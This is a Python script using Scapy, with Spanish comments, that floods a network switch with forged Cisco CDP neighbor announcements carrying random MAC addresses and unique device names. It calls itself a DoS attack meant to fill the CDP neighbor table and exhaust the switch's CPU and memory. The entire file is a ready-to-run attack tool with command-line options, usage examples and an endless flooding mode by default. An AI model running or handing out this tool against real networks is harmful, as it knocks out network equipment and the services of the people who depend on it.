#!/usr/bin/env python3
"""
CDP DoS / Table Flooding
Inunda al switch con anuncios CDP de vecinos falsos (MAC y Device-ID unicos).
Llena la tabla de vecinos CDP y consume CPU/memoria del switch.

Ejemplos:
    sudo python3 cdp_dos.py -i eth0
    sudo python3 cdp_dos.py -i eth0 -n 50 -p 100 -d 0.01
"""
import argparse
import time
from scapy.all import *

load_contrib("cdp")

def parse_args():
    ap = argparse.ArgumentParser(description="Ataque DoS por inundacion CDP")
    ap.add_argument("-i", "--iface", required=True,
                    help="Interfaz de red (ej. eth0)")
    ap.add_argument("-n", "--num", type=int, default=20,
                    help="Dispositivos falsos por rafaga (def. 20)")
    ap.add_argument("-p", "--padding", type=int, default=100,
                    help="Relleno del campo SoftwareVersion (def. 100, evita MTU)")
    ap.add_argument("-d", "--delay", type=float, default=0.0,
                    help="Retardo entre paquetes en seg (def. 0)")
    ap.add_argument("-c", "--count", type=int, default=0,
                    help="Numero de rafagas (0 = infinito)")
    return ap.parse_args()

def main():
    args = parse_args()
    rep = ("* ") * args.padding

    print(f"--- Iniciando inundacion CDP por {args.iface} ---")
    print("Presiona Ctrl+C para detener el ataque.\n")

    rafaga = 1
    try:
        while args.count == 0 or rafaga <= args.count:
            print(f"[*] Iniciando rafaga #{rafaga}")
            for i in range(1, args.num + 1):
                nombre_fake = f"SRV-VULN-{rafaga}-{i:03d}"
                pkt = (Ether(src=RandMAC(), dst="01:00:0c:cc:cc:cc") /
                       LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
                       SNAP(OUI=0x00000c, code=0x2000) /
                       CDPv2_HDR() /
                       CDPMsgDeviceID(val=nombre_fake) /
                       CDPMsgPortID(iface=f"Eth{i % 48}") /
                       CDPMsgSoftwareVersion(val=rep) /
                       CDPMsgPlatform(val="Cisco Nexus 9000"))
                sendp(Ether(raw(pkt)), iface=args.iface, verbose=False)
                if args.delay:
                    time.sleep(args.delay)
            print(f"[+] Rafaga #{rafaga} completada ({args.num} paquetes).")
            rafaga += 1
    except KeyboardInterrupt:
        print("\n[!] Inundacion detenida.")

if __name__ == "__main__":
    main()
